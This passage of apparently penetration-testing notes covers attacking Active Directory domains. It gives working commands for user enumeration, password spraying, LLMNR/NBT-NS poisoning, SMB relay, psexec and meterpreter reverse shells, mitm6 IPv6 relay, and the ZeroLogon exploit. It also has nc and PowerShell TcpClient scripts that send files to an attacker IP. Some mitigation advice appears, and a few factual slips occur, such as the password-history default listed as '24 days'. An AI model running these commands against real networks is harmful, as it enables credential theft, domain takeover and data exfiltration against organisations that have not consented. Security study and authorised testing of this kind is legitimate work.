<a id="activedirexternalrecon"></a>

#### **`External Recon`**

External reconnaissance of the target can serve many different functions, including:
* Validating information provided in the scoping document from the client
* Ensuring appropriate actions are taken
* Looking for any information that is publically accessible that can affect the outcome of the pentest, such as leaked credentials. 

When conducting external reconnaissance, there are several key items that an attacker should be looking for. This information may not always be publicly accessible, but it would be prudent to see what is out there. 
* **IP Space**
   * ASN/IP Registrars
* **Domain Information**
   * Domain Registrars & DNS
   * Cloud & Dev Storage Spaces
* **Schema Format**
* **Data Disclosures**
   * Social Media
   * Public-Facing Company Websites
* **Breach Data**
   * Breach Data Sources

<br>

**<u>Finding Address Spaces</u>**

The [BGP Toolkit](https://bgp.he.net/) can be used to research what address blocks are assigned to an organization and what ASN they reside within. By inputting a domain or IP address, the toolkit searches for any results it can. Many large organizations will often self-host their infrastructure, and since they have such a large footprint, they will have their own ASN. 

<br>

**<u>DNS</u>**

DNS can be used to validate the scope and find reachable hosts. [ViewDNS](https://viewdns.info/), dig, and nslookup can all be used to get records and other data. 
```bash
nslookup domain.com

```


**<u>Public Data</u>**

Social media and Google Dork can be extremely useful. Google dorks can be used to filter websites that contain company emails:
```html
intext:"@organization.com" inurl:organization.com
```

<a id="activedirinitialdomainenum"></a>

#### **`Initial Domain Enumeration`**

Initial domain enumeration should include the following:
* Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold
* Take active and passive measures to identify users, hosts, and vulnerabilities
* Document any findings for later use

At this point, the following data points should be sought out for:
* **AD Users:** Enumerate valid user accounts that can be targeted for password spraying

* **AD Joined Computers:** Key computers include domain controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.

* **Key Services:** Kerberos, NetBIOS, LDAP, DNS

* **Vulnerable Hosts and Services:** Anything that can be a quick win to gain a foothold

<br>

**<u>Identifying Hosts (Passive)</u>**

If one the same local network as the AD machines, `wireshark` and `TCPDump` can be used to directly listen on the network. 

For wireshark, filter the protocol to MDNS/ARP to find hosts to attack:
```bash
sudo -E wireshark

```
If a GUI is not available, use `TCPDump`, net-creds, and NetMiner to do the same. For TCPDump, captured traffic can be saved to a .pcap file, then sent to another host to be opened in wireshark:
```bash
sudo tcpdump -i <interface>

```
`Responder` should also be used to analyze network traffic and determine if anything else in the domain pops up. Responder is a tool to listen, analyze, and poison LLMNR, NBT0NS, and MDNS requests and responses. To identify hosts, it can be set up to passively listen to the network, as follows:
```bash
sudo responder -I <inteface> -A 

```
When Responder is started with passive analysis mode enabled, requests will flow into the session. This is particularly important to start, as some hosts that were not captured in Wireshark will appear.

At this point, some hosts should have been captured. These should be further enumerated with active checks.

<br>

**<u>Identifying Hosts (Active)</u>**

`fping` can be used to sweep the target subnet with ICMP requests. Like ping, fping uses ICMP requests and replies to reach out and interact with a host; however, fping can also issue ICMP packets against a list of multiple hosts at once in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks are critical when checking multiple devices, as they help determine if anything else is active on the internal network:
```bash
fping -asgq x.x.x.x/CIDR

```
`nmap` should be one of the initial scans when conducting a penetration test. As known, this can determine what services each host is running, identify critical hosts such as domain controllers and web servers, and identify potentially vulnerable hosts to probe later. Because the focus is on AD, after doing a broad sweep, it would be a good idea to focus on standard protocols typically seen accompanying AD services, such as **DNS, SMB, LDAP, Kerberos,** etc.
```bash
sudo nmap -T4 -A -v -Pn  x.x.x.x    #single host
sudo nmap -T4 -A -v -Pn -iL hosts.txt    #list of hosts
```
From this output, the naming standard used by NetBIOS, DNS, and the domain controller should be obtained, as well as open ports and running services. Under LDAP, the **rootDomainNamingContext** attribute discloses the name of the root domain, the **defaultNamingContext** attribute discloses the distinguished name of the particular domain controller (this may be a child domain), and the hostname (computer name) of the device is the first value in the **dnsHostName** attribute. To see this better, run the following command:
```bash
nmap -sT -Pn -n --open x.x.x.x -p389 --script ldap-rootdse
```
It is also crucial to look at the OS used, as it could be vulnerable to older exploits. Regardless, the results of these scans will point the attacker to where they should start looking for potential domain enumeration avenues. It is important to find a way to a domain user account or SYSTEM level access on a domain-joined host, so that a foothold can be obtained. 

At this point, the domains and running services should be known, so those servers should be polled and users should be enumerated. 

<br>

**<u>Identifying Users</u>**

The next important step is to find a way to establish a foothold in the domain by either obtaining clear text credentials or an NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account. Obtaining a valid user with credentials is criticil in the early stages of an internal pentest; this access opens up many opportunities to perform enumeration and attacks. 

`Kerbrute` can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. Kerbrute is especially useful with jsmith.txt or jsmith2.txt user lists from [insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Kerbrute can be pointed at the DC and fed a wordlist. To get started, download a [precompiled binary](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) and configure it:
```bash
sudo git clone https://github.com/ropnop/kerbrute.git

sudo make all

cd dist     #where all of the compiled binaries are

./kerbrute_linux_amd64  #run the tool

sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute  #add binary to PATH

```
Once everything is set up, users can be enumerated with kerbrute and a valid wordlist:
```bash
kerbrute userenum -d DOMAIN.CONTROLLER --dc x.x.x.x <wordlist> -o valid_ad_users
```
From the output, users will be validated in the domain. These results can be put in a file to use in targeted password spraying attacks. 

To make this process easier, the `auxiliary/scanner/smb/smb_lookupsid` and `auxiliary/gather/kerberos_enumusers` modules can be used in msfconsole. 
 
<br>

**<u>Identifying Potential Vulnerabilities</u>**

The local system account `NT AUTHORITY\SYSTEM` is a built-in account in Windows OSs. It has the highest level of access in the OS and is used to run most Windows services. It is also common for third-party services to run in the context of this account by default. A SYSTEM account on a domain-joined host will be able to enumerate AD by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account. 

There are several ways to gain SYSTEM-level access on a host, including but not limited to:
* Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep
* Abusing a service running in the context of the SYSTEM account, or abusing the service account SeImpersonate privileges using Juicy Potato
   * This type of attack is possible on older WIndows OS' but not always possible with Windows Server 2019
* Local privilege escalation flaws in Windows OS' such as the Windows 10 Task Scheduler 0-day
* Gaining admin access on a domain-joined host with a local account and using psexec to launch a SYSTEM cmd window


By gaining SYSTEM-level access on a domain-joined host, an attacker will be able to perform actions such as, but not limited to:
* Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView
* Perform Kerberoasting/ASREPRoasting attacks within the same domain
* Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks
* Perform token impersonation to hijack a privileged domain user account
* Carry out ACL attacks

<a id="activedirenumetretrpasswdpols"></a>

#### **`Enumerating & Retrieving Password Policies`**

The domain password policy can be pulled in several ways, depending on how the domain is configured and whether or not the attacker has valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as `crackmapexec` or `rpcclient`.
```bash
crackmapexec smb x.x.x.x -u username -p password --pass-pol

```
Without credentials, however, it may be possible to obtain the password policy via an SMB NULL session or LDAP anonymous bind.

**<u>SMB NULL Sessions (From Linux)</u>**

SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy domain controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server. When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily with tools like enum4linux, crackmapexec, rpcclient, etc. 

rpcclient can be used to check a domain controller for SMB NULL session access. Once connected, RCP commands, such as `querydominfo`  can be used to obtain information about the domain and confirm NULL session access, or `getdompwinfo` can be used to obtain the password policy :
```bash
rpcclient -U "" -N x.x.x.x

rpcclient $> querydominfo

rpcclient $> getdompwinfo

```
Similarly, `enum4linux` is a tool built arounf the Samba suite of tools nmblookup, net, rpcclient, and smbclient to use for enumeration of Windows hosts and domains. The following can be used to gather information about a domain, including the password policy:
```bash
enum4linux -P x.x.x.x

```
enum4linux-ng may be a better option, as it has additional features, like the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools:
```bash
enum4linux-ng -P x.x.x.x -oA output_file

```

**<u>LDAP Anonymous Bind (From Linux)</u>**

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. This configuration, however, is still seen occasionally, as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD. 

With LDAP anonymous bind, LDAP-specific enumeration tools such as `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., can be used to pull the password policy:
```bash
ldapsearch -H ldap://x.x.x.x -x -s base namingcontexts

ldapsearch -h x.x.x.x -x -b "DC=DOMAIN,DC=DOMAIN" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

python3 windapsearch.py -d {Domain} --dc-ip x.x.x.x -U

python3 windapsearch.py -d {Domain} --dc-ip x.x.x.x -U --full | grep Password

```
**<u>SMB NULL Sessions (From Windows)</u>**

NULL session attacks are much less common on Windows, but the following command can be done to establush a null session from a Windows machine and confirm if more of this type of attack can be done:
```powershell
net use \\DC01\ipc$ "" /u:""

```
Also, a username/password combination can be used to attempt to connect. Depending on the error message, information will be gathered:
```powershell
net use \\DC01\ipc$ "" /u:guest

```
If it is possible to authenticate to the domain from a Windows host, built-in Windows binaries, such as net.exe, can be used to retrieve the password policy. Other tools, like PowerView and crackmapexec, can be ported to Windows. 

Using built-in Windows commands is helpful in scenarios that tools cannot be transfered onto the attacking machine. The following command shows basic information on the victim machine via CLI
```powershell
net accounts

```
PowerView has the same functionality:
```powershell
import-module .\PowerView.ps1

Get-DomainPolicy

```
The default password policy when a new domain is created is as follows (this is important to know because many organizations may have never changed their policy):

<center>

|Policy|Default Value|
|------|-------------|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Password must meet complexity requirements|Enabled|
|Store passwords using reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset account lockout counter after|Not set|

</center>


Once the password policy is enumerated, create a target user list to perform a password spraying attack. Again, be careful to not lock out attacks

### **`Initial Attack Vectors`**

<a id="adllmnr"></a>

#### **`Link Local Multitask Name Resolution (LLMNR)`**

LLMNR, previously called NBT-NS, is a protocol used to identify hosts when DNS fails. When traffic is being intercepted on an AD network that uses LLMNR, a username and NTMLv2 hash can be captured if appropriately responded to. This attack is likely to work, especially during a time when many people are logging on to their devices, because LLMNR is enabled by default in many networks. This attack works as follows:
1. Victim tries to access shared folder, but misspells the name of the folder
2. The server does not understand the misspelling 
3. The victim sends a broadcast message, asking anyone on the local network if they know how to reach the misspelled folder
4. The attacker intercepts this request via a MiTM attack, telling the victim to send over its hash in order to "connect" them with the shared folder
5. The attacker cracks the hash offline

**<u>Mitigation Techniques</u>**

* **Disable LLMNR**
   1. Go to Windows Server
   2. Enter Group Policy Management
   3. Edit an existing policy (Default Domain Policy)
   4. See the drop down menu under **Policies,** then the drop down menu in **Administrative Template,** and then click on **Network**
   5. Select DNS Client
   6. Enable **Turn off multicast name resolution,** and push it out to the network

* **Disable NBT-NS**
   1. Network Connections 
   2. Network Adaprter Properties 
   3. TCP/IPv4 Properties
   4. Advanced
   5.  WINS tab and select "Disable NetBIOS over TCP/IP"

* **If neither option is possible, then follow the best practices:**
   * Implement a password policy, forcing users to have long and complex passwords
   * Require Network Access Control
   * Permission settings should have to allow a device onto a network, instead of letting  unknown devices connect

<a id="adllmnrlinux"></a>

##### **`LLMNR (From Linux)`**

To execute this attack, listen to traffic on  `responder`:
```bash
sudo responder -I <interface> -dP

```
When a significant event occurs, a hash will be output to the responder listener. Beginning from the username, copy the entire hash and save it to a file; the exact hash type will be shown on the screen. Now, find the module number associated with the received hash; the following assumes NTLM:
```bash
hashcat --help | grep NTLM
```
Crack the hash:
```bash
hashcat -m 5600 saved_hash.txt /usr/share/wordlist/rockyou.txt --force
```

<a id="adllmnrwindows"></a>

##### **`LLMNR (From Windows)`**

LLMNR & NBT-NS poisoning is possible from a Windows host via [Inveigh](https://github.com/Kevin-Robertson/Inveigh). Inveigh can listen to IPv4, IPv6, LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV and Proxy Auth. 

Before using Inveigh, import the module:
```powershell
Import-Module .\Inveigh.ps1

```
To spoof NBNS and LLMNR and write to a file, the following command can be used:
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

```
This command will get LLMNR and mDNS requests, eventually yielding hashes for particular accounts that can eventually be cracked offline, or used in another attack. The PowerShell version of this script is not maintained, so the C# version may need to be compiled (to an executable), and then used.

When in the interactive console of the compiled script, a view of the captured hashes can be obtained by typing:
```powershell
GET NTLMV2UNIQUE

```
Similarly, the following command can be input to see which usernames have been collected, which is useful for listing users to enumerate later:
```powershell
GET NTLMV2USERNAMES
```

<a id="activedirpasswdspraying"></a>

#### **`Password Spraying`**

<a id="activedircreatingpasswdsprayinglist"></a>

##### **`Making a Target User List`**

To conduct a successful password spraying attack, the attacker first needs to gather a list of valid users by using the following methods:
* Leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller

* Using an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list

* Using a tool like `Kerbrute` to validate users using a word list from a source like the `statistically-likely-usernames` repo, or gathered by using a tool like `linkedin2username` to create a list of potentially valid users

* Using a set of credentials from a Linux or WIndows attack system either provided by the client or obtained through another means, like LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

Regardless of the chosen method, it is also important to consider the domain password policy. If there is an **SMB NULL session, LDAP anonymous bind, or a set of valid credentials,** the password policy can be enumerated. This policy can be useful because the minimum password length and whether or not password complexity is enabled can help formulate the list of password to use in the spray attempts. Knowing the account lockout threshold and bad password timer will disclose how many spray attempts can be done at a time without locking out any accounts, and how many minutes should be between spray attempts. 

**If on an internal machine without valid domain credentials, look for SMB NULL sessions or LDAP anonymous binds on domain controllers.** Either of these will allow the attacker to obtain an accurate list of all users with AD and the password policy. However, if the attacker already has credentials for a domain user or SYSTEM access on a Windows host, then they can easily query AD for this information. It is possible to do this using the SYSTEM account because it can impersonate the computer
* A computer object is treated as a domain user account, but it can authenticate across forest trusts
* If no valid domain accounts are accessible, and SMB NULL sessions and LDAP anonymous binds are not possible, create a user list using external resources, like email harvesting and Linkedin
   * This user list will not be as complete, but it may be enough to grant access to AD


<br>

**<u>SMB NULL Session to Pull User List</u>**

By using the following syntax, `enum4linux` can disclose valid user accounts if SMB NULL sessions are possible:
```bash
 enum4linux -U x.x.x.x  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

```
If **`rpcclient` allows anonymous connections**, the enumdomusers command can be used to make a target user list:
```bash
rpcclient -U "" -N x.x.x.x

rpcclient $> enumdomusers 

```
Finally, **`CrackMapExec` can be used with the --users flag.** This will show the badpwdcount (invalid login attempts), so any accounts that are close to the lockout threshold can be removed from the list. This also show the baddpwdtime, which is the date and time of the last bad password attempt, enabling an attacker to see how close an account is to having its badpwdcount reset. In an environment with multiple domain controllers, this value is maintained separately on each one. To get an accurate total of the account't bad password attempts, query each domain controller and use the sum of the values or query the domain controller with the PDC Emulator FSMO role:
```bash
crackmapexec smb x.x.x.x --users

```

**<u>Gathering Users with LDAP Anonymous</u>**

Many tools can be used to gather users when an LDAP anonymous bind is found, including windapsearch and ldapsearch.


If `ldapsearch` is used, it is necessary to specify a valid LDAP search filter"
```bash
ldapsearch -h x.x.x.x -x -b "DC=DOMAIN_CONTROLLER,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

```
To enumerate valid users, `windapseach` will be easier, although knowing how to create LDAP search filters is still very important. With the following syntax, anonymous access is specified by providing a blank username with the -u flag; the -U flag tells the tool to only retrieve users:
```bash
./windapsearch.py --dc-ip x.x.x.x -u "" -U

```

**<u>Enumerating Users with Kerbrute</u>**

Again, if there is no access at all in the internal network, kerbrute can be used to enumerate valid AD accounts and for password spraying. Kerbrute uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. 

This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. **If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid.** Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts; however, once a list of valid users is obtained and this tool is used for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout.

Using Kerbrute for username enumeration will generate Windows event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy. The following method uses the complete domain controller, the IP address of the domain controller, and a word list with common usersnames; the `statistically-likely-usernames`  repo can be used for this attack:
```bash
kerbrute userenum -d domain.controller --dc x.x.x.x /usr/share/wordlists

```

**<u>Credentialed Enumeration to Build our User List</u>**

With valid credentials, any of the aforementioned tools can be used to build a user list. The easiest way is with `CrackMapExec`:
```bash 
crackmapexec smb x.x.x.x -u username -p password --users
```

<a id="activedirinternalpassspraylinux"></a>

##### **`Internal Password Spraying (from Linux)`**

Once the password policy and valid users have been  enumerated, a password spray attack can be conducted. 

`Rpcclient` is the best choice from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. Invalid login attempts can be filtered out by grepping for Authroity in the response. The following Bash one-liner can be used to perform the attack:
```bash
for u in $(cat valid_user_list.txt); do rpcclient -U "$u%potential_password" -c "getusername;quit" x.x.x.x | grep Authority; done

```
`Kerbrute` can also be used for the same attack:
```bash
kerbrute passwordspray -d domain.controller --dc x.x.x.x valid_user_list.txt potential_password

```
`CrackMapExec` can also be used, as it can accept a text file of usernames to be run against a single password in a spraying attack. The following syntax greps for + to filter out logon failures and hone in on only valid login attempts:
```bash
sudo crackmapexec smb x.x.x.x -u valid_user_list.txt -p potential_password | grep +

```

**<u>Local Administrator Password Reuse</u>**

Internal password spraying is not only possible with domain user accounts; if administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account) is obtained, this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts

Again, `CrackMapExec` can be used for this attack. It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory. Sometimes, the NTLM hash for the local administrator account can be retrieved from the local SAM database. In these instances, spray the NT hash across an entire subnet to hunt for local administrator accounts with the same password set. The `--local-auth` flag tells the tool to only attempt to log in once on each machine, removing any risk of account lockout:
```bash
sudo crackmapexec smb --local-auth x.x.x.x/CIDR -u administrator -H <NT Part of Hash> | grep +
```

<a id="activedirinternalpassspraywindows"></a>

##### **`Internal Password Spraying (from Windows)`**

From a foothold on a domain-joined Windos host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray_) tool is highly effective. If an attacker is authenticated to the domain, the tool will automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out. A user list can also be supplied if not authenticated to the domain. 

In this case, since the hostis domain-joined, the `-UserList` flag is skipped and the tool generates a list. Supply the password flag and one single password, then use the `-OutFile` flag to write the output to a file for later use:
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```
`Kerbrute` can also be used to perform the same user enumeration and spraying steps shown previously. 

<a id="adsmbrelayattcks"></a>

#### **`SMB Relay Attacks`**

Instead of cracking the hashes gathered by responder, the hashes can be relayed to specific machines to potentially gain access. For this attack to work:
* SMB signing must be disabled or not enforced on the target
   * By default, SMB signing is not enabled/enforced on workstations but it is enabled/enforced on servers
* Relayed user credentials must be admin on machine for any real value. 

For this attack to work, an event needs to be triggered. When Responder catches a hash, it will forward it to ntlmrelayx, and ntlmrelayx will forward the hash to the selected target. ntlmrelayx will output the captured SAM hashes onto the screen. 

First, identify a host that does not have SMB signing:
```bash
nmap --script=smb-security-mode.nse -p445 {Target IP} -Pn

```
If SMB signing is enabled on the host, but not enforced (or neither enabled nor enforced), **turn off SMB and HTTP in Responder's configuration file.** Remember to turn them back on after the attack:
```bash
vim /etc/responder/Responder.conf

```
Run responder and ntlmrelayx.py concurrently:
```bash
sudo responder -I <interface> -dP

impacket-ntlmrelayx -tf hosts.txt -smb2support [-i]
```
* The `hosts.txt` file contains the IP addresses that do not have SMB signing enabled/enforced
   * Each IP address should be on its own line

* The `-i` flag will provide an interactive shell once a **SAM hash** is captured. 
   * If omitted, the SAM hashes must be cracked to access the captured user accout.
   * Alternatively, a `-c` flag, followed by a specific command, can be specified to run certain commands
   * A netcat listener must be started to gain access to the interactive shell. Instead of specifying the IP address of the AD machine, localhost must be specified with the port 11000
```bash
nc 127.0.0.1 11000

```
**<u>Mitigation Techniques</u>**

* **Enable SMB Signing on all Devices:** This should be standard, as the tradeoff is good
   * Pro: Stops SMB Relay Attacks completely
   * Con: Causes performance issues with file copies, and introduces a 10-20% speed decrease

* **Disable NTLM Authentication on Network**
   * Pro: Stops SMB Relay Attacks completely
   * Con: If Kerberos stops working, Windows defaults back to NTLM

* **Account Tiering:** This is considered best practice, and should be done regardless. To implement this, use a low level account to use computer, but use an administrative account to log onto the domain controller. 
   * Pro: Limits domain admins to specific tasks (i.e., only log onto servers with need for domain admins). To implement this, 
   * Con: Difficult to enforce

* **Local Admin Restriction:** This is considered best practice, and should be done regardless
   * Pro: Can prevent lateral movement. 
      * Use LAPS (gives unique local admin password for machines)
      * Limit local admins on network  
   * Con: Potential increase in the amount of service desk tickets

<a id="adgainingshellaccess"></a>

#### **`Gaining Shell Access`**

Before starting this portion, it is important to understand the different parts of a captured NTLM hash. Once a hash is captured, there are two different parts of the hash. Depending on the goals of the attack, the NT portion of the hash is the main point of focus for password cracking, but for other attacks, like pass the hash, the entire hash is normally needed. The structure is as follows:
```powershell
User:number:LM:NT:::

```
Obtaining a shell can be made possible from gathered system information, or through metasploit. To gain a shell through msfconsole, the **SMBUser, SMBPass, and SMBDomain** must all be known. For the SMBPass, both SAM hashes or plaintext can work. Similarly, the SMBUser can be the username of the captured hash or administrator. 
```bash
msfconsole

use exploit/windows/smb/psexec

set payload windows/x64/meterpreter/reverse_tcp    #modify if necessary

set targets [1, 2] # 1 is PS and 2 is native upload

```
If a shell is gained through psexec, do an NTLM hash attack. To do this, background the shell session first. The SMBDomain is not needed for this attack, and the SMBUser should be switched to a local user, administrator in this case:
```bash
set smbuser administrator

unset smbdomain

set smpass <hash_value>    #take the password hash, including the : separating LM & NT

```
Metasploit can be suspicious on a network, so instead of running psexec on msfconsole, it can be run directly through the CLI:
```bash
impacket-psexec domain.local/username:'password'@x.x.x.x       #plaintext password

impacket-psexec domain/username:'password'@x.x.x.x             #plaintext password

impacket-psexec username@x.x.x.x -hashes <hash_value>   

```
If psexec is blocked, use `wmiexec` or `smbexec` with the same commands. 

If there is an upload functionality that may lead to a reverse shell, the following payload can be created and hosted on a local webserver while listening on metasploit:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=x.x.x.x -f exe -o script.exe lport=xxxx #change to reverse_tcp in some cases

python3 -m http.server 80

msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_https #change to match payload
```
If there is PowerShell access on the Windows target, the following command can be used to query the payload and obtain a metasploit session
```powershell
Invoke-WebRequest -Uri "http://x.x.x.x/script.exe " -OutFile "script.exe"

```

<a id="activediripv6attacks"></a>

#### **`IPv6 Attacks`**

This attack primarily relies on DNS takeover via IPv6. While this is another form of hash relaying, it is quite reliable because it uses IPv6. Even though IPv6 is not typically used, it is often on; no one usually does DNS for IPv6. Because of this, an attacker listens for IPv6 messages and spoofs its IP address to be that of the DNS server, essentially enabling authentication to the domain controller via LDAP or SMB. **This attack should only be run for 5-10 minutes** to avoid network problems. 

When an event occurs, the attacker receives an NTLM hash; similarly, when a legitimate user logs in, their NTLM hash will be sent to the attacker, which will then be LDAP relayed to the domain controller. If the credentials received are that of a domain administrator, the attacker logs in and a new account is created when `mitm6` and `ntlmrelayx` and used together. 

Set up ntlmrelayx:
```bash
impacket-ntlmrelayx -6 -t ldaps://{Domain Controller IP} -wh fakewpad.domain.controller -l newfolder

```
Start MiTM6 and target the AD server by specifying the domain:
```bash
sudo mitm6 -d domain.controller

```
Now, when an event occurs on the network (i.e., user log in, machine reboot, etc), the event will be relayed to the domain controller. Depending on who the user is, the output will vary; regardless, the event will populate information within the folder created through ntlmrelayx (newfolder). Most importantly, when a user logs in, a new account will be created and assigned to a privileged group. 
* Look through the output for the username and password of the new user to perform DCSync with secretsdump.py


**<u>Mitigation Techniques</u>**

IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If IPv6 

* **Disable IPv6 Internally (Not recommended)**
   * This may lead to unwanted side effects, so it should not be done always

* **Enable Blocks in Windows Firewall via Group Policy**
   * Block inbound and outbound DHCPv6 traffic 
   * Block inbound Router Advertisements (ICMPv6)
   
* **Disable WPAD if Unused:** This is considered best practice, so it should be done regardless
   * If WPAD is not being used in the environment, disable it via Group Policy and disable the WinHttpAutoProxySvc service

* **Prevent LDAP/S Relay:** This is considered best practice, so it should be done regardless
   * This can be prevented by enabling both LDAP signing and LDAP channel binding
 
* **Create Protected Users Group:** This is considered best practice, so it should be done regardless
   * Consider moving administrative users to the Protected Users group or marking them as "Account is sensitive and cannot be delegated." 
   * This will prevent any impersonation of that user via delegation

<a id="activedirpassbackattacks"></a>

#### **`Passback Attacks`**

A passback attack is an older attack that concerns printers, IoT devices, network file shares, web applications, RDP, and SSH, but it is still occassionally seen on modern networks. This is a type of authentication attack where an attacker tricks a target system into sending its authentication credentials (NTLM hashes or Kerberos tickets) to a malicious service, which then "passes back" the authentication request to another system to gain unauthorized access. 

**1. Luring the Target:** Look for something that connects to LDAP, SMB, or HTTP on the AD server. Change the IP address of the server to that of the attacking machine. If this is not viable, the attacker can set up a malicious server and trick a victim to connect to it through phishing, malicious links, or exploiting network misconfigurations

**2. Capture Credentials:** When the victim attempts to authenticate, their credentials are sent to the attacker. This can be done by starting a netcat listener or responder on the service that was targeted. The password should be returned in plaintext

Now that the attacker has the credential of the victim, they can authenticate to the AD server with the their credentials. 

<a id="activedirzerologon"></a>

#### **`Abusing ZeroLogon`**

This attack targets the domain controller, sets the password to NULL, and takes over the domain controller. If the password is not restored, the domain controller will break, so this must be carefully done. Often times, this attack is not worth doing because of the potential risk. This attack is also known as [CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472). 

Before running this exploit, [test](https://github.com/SecuraBV/CVE-2020-1472) the AD server to see whether the AD server is vulnerable to ZeroLogon. If it is determined that the AD server is vulnerable, proceed with the exploit:
```bash
python3 /CVE-2020-1472/cve-2020-1472-exploit.py <NETBIOS name of DC> x.x.x.x

impacket-secretsdump -just-dc DOMAIN/DOMAIN-CONTROLLER\$@x.x.x.x        #hit enter for password

impacket-secretsdump administrator@x.x.x.x -hashes <Administrator hash>    #prints plain password hex; used to restore DC

python3 restorepassword.py DOMAIN/DOMAIN-CONTROLLER@DOMAIN-CONTROLLER -target-ip x.x.x.x -hexpass <previous value>
```

#### **`Bloodhound`**

Before using bloodhound, make sure the latest version is installed. Once the latest version is installed, run neo4j:
```bash
sudo neo4j console

```
The output of this command will give the exact port that neo4j is listening on, but it is typically 7474. Log in with the credentials neo4j:neo4j; after the first log in, the user will be prompted to change the password to any value (make it neo4j1 to remember it).

Once all of the files are generated from the previous command, upload the data to bloodhound interactively through the GUI. After the files are uploaded, go to the analysis section and select whatever option necessary. `SharpHound.exe` can be used to collect data from the compromised machine, then sent over to the attacking machine. This, and other scripts, can be sent to the attacking machine by using wget (cmd; start a server on the attacking machine first, then wget from the Windows) or the following PowerShell command:
```powershell
Invoke-WebRequest -Uri "http://x.x.x.x/SharpHound.exe" -OutFile "SharpHound.exe"

```
To do the opposite (send files from a Windows machine to the attacking machine), the method depends on the session type, i.e., PowerShell or CMD. For both methods, a netcat listener must be set up on an ephemeral port on the attacking machine, as follows:
```bash
nc -lvnp xxxx > loot.zip         #change file extension if necessary
```
Use the following command format for a **CMD** prompt session. The Windows machine must have **nc.exe** for this to work; wait a while for the file to upload, then close the session from the attacking machine if it has not closed automatically:
```powershell
type C:\Path\To\file.zip | C:\Path\To\nc.exe x.x.x.x xxxx            #attacking IP followed by port

```
Use the following command format for **PowerShell** sessions. Once this is executed, the local machine should have the data written to the specified file
```powershell
$ip = "x.x.x.x"
$port = xxxx         #set from attacking machine
$file = "C:\Path\To\file.zip"           #change file extension if necessary
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes($file)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```

<a id="activedirenumseccontrols"></a>

#### **`Enumerating Security Controls`**

After gaining a foothold, get a feeling for the defensive state of the hosts, enumerate the domain further now that the visibility is not restricted, and, if necessary, work at "living off the land" by using tools that exist natively on the hosts. It is important to understand the security controls in place in an organization as the products in use can affect the tools that are used for AD enumeration, as well as exploitation and post-exploitation. Understanding the protections 

**<u>Windows Defender</u>**

Windows Defender has greatly improved over the years and, by default, will block tools like PowerView. The built-in PowerShell cmdlet `Get-MpComputerStatus` can be used to get the current Defender Status. If the **RealTimeProtectionEnabled** parameter is set to True, Defender is enabled on the system:
```powershell
Get-MpComputerStatus

